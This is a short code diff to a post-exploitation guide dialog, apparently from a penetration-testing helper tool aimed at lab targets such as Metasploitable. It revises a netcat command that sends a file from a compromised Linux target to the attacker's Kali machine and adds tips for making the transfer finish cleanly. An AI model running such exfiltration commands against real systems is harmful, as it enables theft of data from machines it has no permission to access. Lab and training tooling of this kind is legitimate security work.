@@ -2094,8 +2094,16 @@ class PostExploitGuideDialog:
         if self._os == "linux":
             self._cmd_row(
                 parent, "target:",
-                f"nc {self._kali_ip} 9001 < {self._remote_out}",
-                hint="Then the listener above writes it to disk on Kali")
+                f"nc -q 0 {self._kali_ip} 9001 < {self._remote_out}",
+                hint="-q 0 makes nc CLOSE the connection right after sending. "
+                     "Traditional / GNU netcat (old boxes like "
+                     "Metasploitable) keeps the socket OPEN on stdin EOF, so "
+                     "without -q the listener hangs forever and never prints "
+                     "'Saved' — even though the file already transferred in "
+                     "full.  If the target's nc rejects -q (OpenBSD nc), drop "
+                     "it or use -N; either way the data still arrives, so you "
+                     "can also just Ctrl-C the listener once the Kali file "
+                     "stops growing.")
         else:
             self._cmd_row(
                 parent, "target:",
